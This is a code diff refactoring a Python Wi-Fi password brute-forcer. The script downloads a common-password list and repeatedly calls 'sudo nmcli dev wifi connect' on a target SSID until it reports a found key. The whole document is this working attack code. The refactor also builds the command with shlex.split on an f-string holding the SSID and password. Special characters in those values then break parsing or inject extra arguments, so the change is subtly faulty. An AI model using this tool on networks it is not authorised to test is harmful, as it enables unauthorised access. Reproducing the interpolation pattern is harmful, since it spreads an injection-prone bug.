@@ -7,6 +7,7 @@ import urllib.request
 import sys
 import time
 import shlex
+from typing import Generator
 
 DEFAULT_PASSWORD_LIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
 
@@ -176,27 +177,28 @@ def prompt_for_target_choice(ssid_list: list[tuple[str, str]]) -> str:
         print(f"Invalid choice: Please pick a number between 1 and {len(ssid_list)}")
 
 
+def normalized_passwords(passwords: list[str]) -> Generator[str, None, None]:
+    for password in passwords:
+        # necessary due to NetworkManager restart after unsuccessful attempt at login
+        password = password.strip()
+
+        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
+        yield password if isinstance(password, str) else password.decode("utf-8")
+
+
 """
 	This function takes the targeted network and list of password and attempt to brute force it.
 """
 
 
 def brute_force(ssid, passwords, args):
-    for password in passwords:
-        # necessary due to NetworkManager restart after unsuccessful attempt at login
-        password = password.strip()
-
-        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
-        if isinstance(password, str):
-            decoded_line = password
-        else:
-            decoded_line = password.decode("utf-8")
+    for password in normalized_passwords(passwords):
             
         if args.verbose is True:
             print(bcolors.HEADER+"** TESTING **: with password '" +
-                decoded_line+"'"+bcolors.ENDC)
+                password+"'"+bcolors.ENDC)
 
-        if (len(decoded_line) >= 8):
+        if (len(password) >= 8):
             contain = False
             
             while contain == False:
@@ -209,39 +211,30 @@ def brute_force(ssid, passwords, args):
                 else:
                     time.sleep(1)
             
-            commands = [
-                "sudo",
-                "nmcli",
-                "dev",
-                "wifi",
-                "connect",
-                ssid,
-                "password",
-                decoded_line,
-            ]
+            command = shlex.split(f"sudo nmcli dev wifi connect {ssid} password {password}")
             
             try:
-                output = subprocess.run(commands, capture_output=True, text=True, 
+                output = subprocess.run(command, capture_output=True, text=True, 
                     check=True)
                 if "error" in output.stdout.lower():
                     if args.verbose is True:
                         print(bcolors.FAIL+"** TESTING **: password '" +
-                            decoded_line+"' failed."+bcolors.ENDC)
+                            password+"' failed."+bcolors.ENDC)
                         print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")
                 elif "successfull" in output.stdout.lower():
                     sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                        decoded_line+"' succeeded."+bcolors.ENDC)
+                        password+"' succeeded."+bcolors.ENDC)
                 else:
                     print(f"Unknown output: {output.stdout}")
             except subprocess.CalledProcessError:
                 if args.verbose is True:
                     print(bcolors.FAIL+"** TESTING **: password '" +
-                        decoded_line+"' failed."+bcolors.ENDC)
+                        password+"' failed."+bcolors.ENDC)
 
         else:
             if args.verbose is True:
                 print(bcolors.OKCYAN+"** TESTING **: password '" +
-                    decoded_line+"' too short, passing."+bcolors.ENDC)
+                    password+"' too short, passing."+bcolors.ENDC)
 
     print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
 
